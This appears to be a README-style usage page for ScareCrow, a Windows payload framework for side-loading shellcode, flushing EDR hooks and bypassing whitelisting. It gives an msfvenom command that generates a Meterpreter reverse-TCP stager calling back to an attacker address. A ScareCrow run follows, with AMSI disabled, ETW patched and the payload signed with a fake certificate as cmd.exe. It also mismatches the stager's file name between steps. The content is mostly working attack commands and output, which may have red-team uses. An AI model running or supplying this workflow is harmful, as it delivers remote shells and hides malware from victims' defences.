# Scarecrow

### Overview

ScareCrow is a payload creation framework for side loading (not injecting) into a legitimate Windows process (bypassing Application Whitelisting controls). Once the DLL loader is loaded into memory, it utilizes a technique to flush an EDR’s hook out of the system DLLs running in the process's memory. This works because we know the EDR’s hooks are placed when a process is spawned.

### Install

```
sudo apt install openssl osslsigncode mingw-w64 
go build ScareCrow.go
```

### Usage

* generate some raw shellcode&#x20;

```
msfvenom LHOST=192.168.15.97 LPORT=8443 -p windows/x64/meterpreter/reverse_tcp  -f raw -o /tmp/stager.exe
```

* run the tool with the options you want&#x20;

```
./ScareCrow -Evasion Disk -Exec NtQueueApcThreadEx -Loader binary -O binary -domain www.google.com -encryptionmode AES -noamsi -obfu -outpath /tmp -I /tmp/stager.raw
 
  _________                           _________                       
 /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
 \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
 /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     / 
/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/  
        \/     \/     \/            \/        \/                      
                                                        (@Tyl0us)
        “Fear, you must understand is more than a mere obstacle. 
        Fear is a TEACHER. the first one you ever had.”

[!] -O not needed. This loader type uses the name of the file they are spoofing
[!] Missing Garble... Downloading it now
[+] Shellcode Encrypted
[+] Patched ETW Enabled
[+] Sleep Timer set for 2830 milliseconds 
[*] Creating an Embedded Resource File
[+] Created Embedded Resource File With cmd's Properties
[*] Compiling Payload with the Garble's literal flag... this will take a while
[+] Payload Compiled
[*] Signing cmd.exe With a Fake Cert
[+] Signed File Created
[+] Binary Compiled
[!] Sha256 hash of cmd.exe: 4ffb9fdb3e6bdb08518baabc997f74e80e6680867c25b82cf4765753dceb6a6e
[*] cmd.exe moved to /tmp/
```

